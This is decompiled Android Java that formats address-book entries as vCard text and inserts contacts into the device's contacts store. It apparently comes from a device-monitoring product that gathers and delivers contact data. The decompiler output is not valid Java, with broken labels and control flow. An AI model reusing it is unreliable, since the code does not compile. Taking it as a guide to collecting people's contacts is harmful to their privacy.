package com.vvt.addressbookmanager.delivery;

import android.content.ContentProviderOperation;
import android.content.ContentProviderOperation.Builder;
import android.content.ContentProviderResult;
import android.content.ContentResolver;
import android.content.ContentUris;
import android.net.Uri;
import android.provider.ContactsContract.Data;
import android.provider.ContactsContract.RawContacts;
import com.vvt.addressbookmanager.a.c;
import com.vvt.events.FxAddressBookEvent;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;

public class b
{
  private static final boolean a = com.vvt.addressbookmanager.d.a;
  private static final boolean b = com.vvt.addressbookmanager.d.e;
  
  public static String a(FxAddressBookEvent paramFxAddressBookEvent)
  {
    boolean bool1 = a;
    if (bool1) {}
    String str = "";
    StringBuilder localStringBuilder;
    Object localObject3;
    Object localObject4;
    label201:
    int j;
    label304:
    int i;
    Object localObject2;
    try
    {
      localStringBuilder = new java/lang/StringBuilder;
      localStringBuilder.<init>();
      Object localObject1 = "BEGIN:VCARD";
      localObject1 = localStringBuilder.append((CharSequence)localObject1);
      localObject3 = "\r\n";
      ((Appendable)localObject1).append((CharSequence)localObject3);
      localObject1 = "VERSION:2.1";
      localObject1 = localStringBuilder.append((CharSequence)localObject1);
      localObject3 = "\r\n";
      ((Appendable)localObject1).append((CharSequence)localObject3);
      localObject3 = paramFxAddressBookEvent.getFirstName();
      localObject1 = paramFxAddressBookEvent.getLastName();
      localObject4 = "N";
      localStringBuilder.append((CharSequence)localObject4);
      boolean bool2 = com.vvt.ag.b.d((String)localObject1);
      if (bool2)
      {
        bool2 = com.vvt.ag.b.d((String)localObject3);
        if (bool2) {}
      }
      else
      {
        localObject4 = ";CHARSET=UTF-8";
        localStringBuilder.append((CharSequence)localObject4);
      }
      localObject4 = ":";
      localObject4 = localStringBuilder.append((CharSequence)localObject4);
      if (localObject1 != null)
      {
        localObject1 = ((String)localObject1).trim();
        localObject1 = ((Appendable)localObject4).append((CharSequence)localObject1);
        localObject4 = ";";
        localObject4 = ((Appendable)localObject1).append((CharSequence)localObject4);
        if (localObject3 == null) {
          break label404;
        }
        localObject1 = ((String)localObject3).trim();
        localObject1 = ((Appendable)localObject4).append((CharSequence)localObject1);
        localObject3 = ";";
        localObject1 = ((Appendable)localObject1).append((CharSequence)localObject3);
        localObject3 = ";";
        localObject1 = ((Appendable)localObject1).append((CharSequence)localObject3);
        localObject3 = ";";
        localObject1 = ((Appendable)localObject1).append((CharSequence)localObject3);
        localObject3 = "\r\n";
        ((Appendable)localObject1).append((CharSequence)localObject3);
        localObject1 = paramFxAddressBookEvent.getWorkEMail();
        bool1 = com.vvt.ag.b.a((String)localObject1);
        if (bool1) {
          break label411;
        }
        localObject1 = paramFxAddressBookEvent.getWorkEMail();
        j = 2;
        a(localStringBuilder, (String)localObject1, j);
        localObject1 = paramFxAddressBookEvent.getWorkPhones();
        j = ((ArrayList)localObject1).size();
        if (j <= 0) {
          break label483;
        }
        localObject3 = ((ArrayList)localObject1).iterator();
        for (;;)
        {
          bool1 = ((Iterator)localObject3).hasNext();
          if (!bool1) {
            break;
          }
          localObject1 = ((Iterator)localObject3).next();
          localObject1 = (String)localObject1;
          i = 3;
          b(localStringBuilder, (String)localObject1, i);
        }
        bool3 = a;
      }
    }
    catch (Exception localException)
    {
      bool1 = b;
      if (bool1) {}
      localObject2 = str;
    }
    for (;;)
    {
      boolean bool3;
      if (bool3) {}
      return (String)localObject2;
      localObject2 = "";
      break;
      label404:
      localObject2 = "";
      break label201;
      label411:
      localObject2 = paramFxAddressBookEvent.getHomeEMail();
      bool1 = com.vvt.ag.b.a((String)localObject2);
      if (!bool1)
      {
        localObject2 = paramFxAddressBookEvent.getHomeEMail();
        j = 1;
        a(localStringBuilder, (String)localObject2, j);
        break label304;
      }
      localObject2 = paramFxAddressBookEvent.getOtherEMail();
      bool1 = com.vvt.ag.b.a((String)localObject2);
      if (bool1) {
        break label304;
      }
      localObject2 = paramFxAddressBookEvent.getOtherEMail();
      j = 3;
      a(localStringBuilder, (String)localObject2, j);
      break label304;
      label483:
      localObject2 = paramFxAddressBookEvent.getHomePhones();
      j = ((ArrayList)localObject2).size();
      if (j > 0)
      {
        localObject3 = ((ArrayList)localObject2).iterator();
        for (;;)
        {
          bool1 = ((Iterator)localObject3).hasNext();
          if (!bool1) {
            break;
          }
          localObject2 = ((Iterator)localObject3).next();
          localObject2 = (String)localObject2;
          i = 1;
          b(localStringBuilder, (String)localObject2, i);
        }
      }
      localObject2 = paramFxAddressBookEvent.getMobilePhones();
      j = ((ArrayList)localObject2).size();
      if (j > 0)
      {
        localObject3 = ((ArrayList)localObject2).iterator();
        for (;;)
        {
          bool1 = ((Iterator)localObject3).hasNext();
          if (!bool1) {
            break;
          }
          localObject2 = ((Iterator)localObject3).next();
          localObject2 = (String)localObject2;
          i = 2;
          b(localStringBuilder, (String)localObject2, i);
        }
      }
      localObject2 = paramFxAddressBookEvent.getOtherNumbers();
      j = ((ArrayList)localObject2).size();
      if (j > 0)
      {
        localObject3 = ((ArrayList)localObject2).iterator();
        for (;;)
        {
          bool1 = ((Iterator)localObject3).hasNext();
          if (!bool1) {
            break;
          }
          localObject2 = ((Iterator)localObject3).next();
          localObject2 = (String)localObject2;
          i = 7;
          b(localStringBuilder, (String)localObject2, i);
        }
      }
      localObject2 = paramFxAddressBookEvent.getNote();
      if (localObject2 != null)
      {
        localObject2 = "NOTE";
        localObject3 = paramFxAddressBookEvent.getNote();
        a(localStringBuilder, (String)localObject2, (String)localObject3);
      }
      localObject2 = paramFxAddressBookEvent.getContactPicture();
      if (localObject2 != null)
      {
        localObject2 = "PHOTO;TYPE=JPEG;ENCODING=BASE64";
        localObject3 = " ";
        a(localStringBuilder, (String)localObject2, (String)localObject3);
        localObject2 = paramFxAddressBookEvent.getContactPicture();
        j = 76;
        localObject4 = "\r\n";
        com.vvt.ag.a.a(localStringBuilder, (byte[])localObject2, j, (String)localObject4);
        localObject2 = "\r\n";
        localStringBuilder.append((CharSequence)localObject2);
        localObject2 = "\r\n";
        localStringBuilder.append((CharSequence)localObject2);
      }
      localObject2 = "END:VCARD";
      localObject2 = localStringBuilder.append((CharSequence)localObject2);
      localObject3 = "\r\n";
      ((Appendable)localObject2).append((CharSequence)localObject3);
      localObject2 = localStringBuilder.toString();
    }
  }
  
  public static void a(Appendable paramAppendable, String paramString, int paramInt)
  {
    Object localObject = "EMAIL;";
    paramAppendable.append((CharSequence)localObject);
    switch (paramInt)
    {
    }
    for (;;)
    {
      boolean bool = com.vvt.ag.b.d(paramString);
      if (!bool)
      {
        localObject = ";CHARSET=UTF-8";
        paramAppendable.append((CharSequence)localObject);
      }
      localObject = paramAppendable.append(":");
      String str = paramString.trim();
      ((Appendable)localObject).append(str).append("\r\n");
      return;
      localObject = ";WORK";
      paramAppendable.append((CharSequence)localObject);
      continue;
      localObject = ";HOME";
      paramAppendable.append((CharSequence)localObject);
      continue;
      localObject = ";CELL";
      paramAppendable.append((CharSequence)localObject);
    }
  }
  
  private static void a(Appendable paramAppendable, String paramString1, String paramString2)
  {
    if (paramString2 != null)
    {
      int i = paramString2.length();
      if (i > 0)
      {
        paramAppendable.append(paramString1);
        boolean bool = com.vvt.ag.b.d(paramString2);
        if (!bool)
        {
          localObject = ";CHARSET=UTF-8";
          paramAppendable.append((CharSequence)localObject);
        }
        Object localObject = paramAppendable.append(":").append(paramString2);
        String str = "\r\n";
        ((Appendable)localObject).append(str);
      }
    }
  }
  
  public static boolean a(com.vvt.addressbookmanager.a.a parama, ContentResolver paramContentResolver)
  {
    int i = 0;
    Object localObject1 = null;
    int j = 2;
    int k = 1;
    parama.e();
    Object localObject2 = parama.b();
    Object localObject4 = parama.c();
    Object localObject5 = "";
    boolean bool1 = a;
    if (bool1) {}
    localObject5 = new java/util/ArrayList;
    ((ArrayList)localObject5).<init>();
    boolean bool2 = a;
    if (bool2) {}
    Object localObject6 = ContentProviderOperation.newInsert(ContactsContract.RawContacts.CONTENT_URI).withValue("account_type", null).withValue("account_name", null);
    localObject1 = Integer.valueOf(j);
    localObject6 = ((ContentProviderOperation.Builder)localObject6).withValue("aggregation_mode", localObject1).build();
    ((ArrayList)localObject5).add(localObject6);
    localObject6 = ContentProviderOperation.newInsert(ContactsContract.Data.CONTENT_URI).withValueBackReference("raw_contact_id", 0);
    localObject1 = "vnd.android.cursor.item/name";
    localObject6 = ((ContentProviderOperation.Builder)localObject6).withValue("mimetype", localObject1);
    Object localObject7 = "data2";
    localObject2 = ((ContentProviderOperation.Builder)localObject6).withValue((String)localObject7, localObject2);
    localObject6 = "data3";
    localObject2 = ((ContentProviderOperation.Builder)localObject2).withValue((String)localObject6, localObject4).build();
    ((ArrayList)localObject5).add(localObject2);
    localObject2 = parama.f();
    if (localObject2 != null)
    {
      localObject2 = ContentProviderOperation.newInsert(ContactsContract.Data.CONTENT_URI).withValueBackReference("raw_contact_id", 0).withValue("mimetype", "vnd.android.cursor.item/photo");
      localObject4 = "data15";
      localObject6 = parama.f();
      localObject2 = ((ContentProviderOperation.Builder)localObject2).withValue((String)localObject4, localObject6).build();
      ((ArrayList)localObject5).add(localObject2);
    }
    localObject2 = parama.g();
    boolean bool3;
    if (localObject2 != null)
    {
      localObject2 = "";
      localObject4 = parama.g();
      bool3 = ((String)localObject2).equals(localObject4);
      if (!bool3)
      {
        localObject2 = ContentProviderOperation.newInsert(ContactsContract.Data.CONTENT_URI).withValueBackReference("raw_contact_id", 0).withValue("mimetype", "vnd.android.cursor.item/note");
        localObject4 = "data1";
        localObject6 = parama.g();
        localObject2 = ((ContentProviderOperation.Builder)localObject2).withValue((String)localObject4, localObject6).build();
        ((ArrayList)localObject5).add(localObject2);
      }
    }
    localObject2 = parama.h();
    localObject4 = ((List)localObject2).iterator();
    for (;;)
    {
      bool3 = ((Iterator)localObject4).hasNext();
      if (!bool3) {
        break;
      }
      localObject2 = (com.vvt.addressbookmanager.a.b)((Iterator)localObject4).next();
      bool2 = localObject2 instanceof c;
      String str;
      if (bool2)
      {
        localObject6 = ((com.vvt.addressbookmanager.a.b)localObject2).a();
        localObject7 = ContentProviderOperation.newInsert(ContactsContract.Data.CONTENT_URI).withValueBackReference("raw_contact_id", 0);
        str = "vnd.android.cursor.item/email_v2";
        localObject6 = ((ContentProviderOperation.Builder)localObject7).withValue("mimetype", str).withValue("data1", localObject6);
        localObject7 = "data2";
        i = ((com.vvt.addressbookmanager.a.b)localObject2).b();
        localObject1 = Integer.valueOf(i);
        localObject6 = ((ContentProviderOperation.Builder)localObject6).withValue((String)localObject7, localObject1).build();
        ((ArrayList)localObject5).add(localObject6);
      }
      bool2 = localObject2 instanceof com.vvt.addressbookmanager.a.d;
      if (bool2)
      {
        localObject6 = ((com.vvt.addressbookmanager.a.b)localObject2).a();
        int i1 = ((com.vvt.addressbookmanager.a.b)localObject2).b();
        if (i1 != k)
        {
          i1 = ((com.vvt.addressbookmanager.a.b)localObject2).b();
          if (i1 != j)
          {
            i1 = ((com.vvt.addressbookmanager.a.b)localObject2).b();
            i = 3;
            if (i1 != i) {
              continue;
            }
          }
        }
        localObject7 = ContentProviderOperation.newInsert(ContactsContract.Data.CONTENT_URI).withValueBackReference("raw_contact_id", 0);
        str = "vnd.android.cursor.item/phone_v2";
        localObject7 = ((ContentProviderOperation.Builder)localObject7).withValue("mimetype", str);
        localObject1 = "data1";
        localObject6 = ((ContentProviderOperation.Builder)localObject7).withValue((String)localObject1, localObject6);
        localObject7 = "data2";
        int m = ((com.vvt.addressbookmanager.a.b)localObject2).b();
        localObject2 = Integer.valueOf(m);
        localObject2 = ((ContentProviderOperation.Builder)localObject6).withValue((String)localObject7, localObject2).build();
        ((ArrayList)localObject5).add(localObject2);
      }
    }
    localObject2 = "com.android.contacts";
    try
    {
      localObject2 = paramContentResolver.applyBatch((String)localObject2, (ArrayList)localObject5);
      localObject4 = null;
      localObject2 = localObject2[0];
      localObject2 = ((ContentProviderResult)localObject2).uri;
      long l = ContentUris.parseId((Uri)localObject2);
      boolean bool4 = a;
      if (bool4) {}
      n = (int)l;
      l = n;
      parama.b(l);
      n = k;
    }
    catch (Exception localException)
    {
      for (;;)
      {
        int n;
        boolean bool5 = b;
        if (bool5) {}
        bool5 = false;
        Object localObject3 = null;
      }
    }
    return n;
  }
  
  public static void b(Appendable paramAppendable, String paramString, int paramInt)
  {
    Object localObject = "TEL";
    paramAppendable.append((CharSequence)localObject);
    int i = 1;
    if (paramInt == i)
    {
      localObject = ";HOME";
      paramAppendable.append((CharSequence)localObject);
    }
    for (;;)
    {
      boolean bool = com.vvt.ag.b.d(paramString);
      if (!bool)
      {
        localObject = ";CHARSET=UTF-8";
        paramAppendable.append((CharSequence)localObject);
      }
      localObject = paramAppendable.append(":");
      String str = paramString.trim();
      ((Appendable)localObject).append(str).append("\r\n");
      return;
      int j = 2;
      if (paramInt == j)
      {
        localObject = ";CELL";
        paramAppendable.append((CharSequence)localObject);
      }
      else
      {
        j = 3;
        if (paramInt == j)
        {
          localObject = ";WORK";
          paramAppendable.append((CharSequence)localObject);
        }
        else
        {
          localObject = ";VOICE";
          paramAppendable.append((CharSequence)localObject);
        }
      }
    }
  }
  
  public static byte[] b(FxAddressBookEvent paramFxAddressBookEvent)
  {
    boolean bool1 = a;
    if (bool1) {}
    byte[] arrayOfByte = a(paramFxAddressBookEvent).getBytes();
    boolean bool2 = a;
    if (bool2) {}
    return arrayOfByte;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/addressbookmanager/delivery/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */